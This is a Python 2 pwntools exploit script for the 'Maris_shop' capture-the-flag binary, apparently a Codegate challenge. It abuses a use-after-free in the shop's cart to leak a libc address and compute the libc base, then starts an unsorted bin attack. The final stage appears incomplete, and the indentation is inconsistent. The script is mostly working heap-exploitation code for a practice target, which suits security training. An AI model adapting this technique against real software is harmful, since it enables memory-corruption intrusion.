from pwn import*
p = process('./Maris_shop')
'''
user cart 0x2032A0 
'''
# definition
t = 0.03
count = 0
res = 0
pie_base = p.libs()['/home/jammin/Desktop/codegate/Maris_shop']
log.info("PIE base : {}".format(hex(pie_base)))
def add_to_cart():
	p.sendlineafter(':','1');sleep(t)
	p.sendlineafter(':','1');sleep(t)
	
	tmp = p.recv()
	if tmp == "Amount?:":
		p.sendline('0');sleep(t)
		return 1
	elif tmp == "Add more?:" :
		p.sendline('0');sleep(t)
		return 0

def buy_item():
	p.sendline('4');sleep(t)
	p.sendline('2');sleep(t)
	p.sendline('1');sleep(t)
	p.recvuntil(':')
	p.recvuntil(':')
	p.recvuntil(':')

def remove_from_cart(idx):
	p.sendline('2');sleep(t)
	p.sendline(str(idx));sleep(t)
	p.recvuntil(':')
	p.recvuntil(':')

### leak 
# UAF
while count != 16:
	if add_to_cart() == 1:
		count += 1

buy_item()

while count != 31:
	if add_to_cart() == 1:
		count += 1
		remove_from_cart(0)
	
add_to_cart()
add_to_cart()

# leak
p.sendlineafter(':','4');sleep(t)
p.sendlineafter(':','1');sleep(t)
p.sendlineafter(':','0');sleep(t)
p.sendlineafter(':','3');sleep(t)
p.sendlineafter(':','1');sleep(t)
p.sendlineafter(':','15');sleep(t)
p.recvuntil('Amount: ')
main_arena = int(p.recvline()[:-1])
libc_base = main_arena - 3951480
log.info('<main_arena+88> : {}'.format(hex(main_arena)))
log.info('libc_base : {}'.format(hex(libc_base)))
remove_from_cart(0)

### exploit
# unsorted bin attack

p.sendlineafter(':','1');sleep(t)
p.recvuntil(' ---- ')
key = p.recv(2)
print 'key: '+key
p.sendlineafter(':','1');sleep(t)
p.sendlineafter(':','0');sleep(t)

p.sendlineafter(':','4');sleep(t)
p.sendlineafter(':','1');sleep(t)
p.sendlineafter(':','15');sleep(t)

while True:
	p.sendlineafter(':','1');sleep(t)
	p.recvuntil(' ---- ')
        tmp = p.recv(2)
	print 'tmp: '+tmp
        if tmp == key:
                p.sendlineafter(':','1');sleep(t)
		ttmp = p.recv()
		if ttmp == "Add more?:":
			print "!!!"
			break
		else:
			p.sendline('0');sleep(t)
	else :
		p.sendlineafter(':','0');sleep(t)
	print "failed"

	

p.interactive()









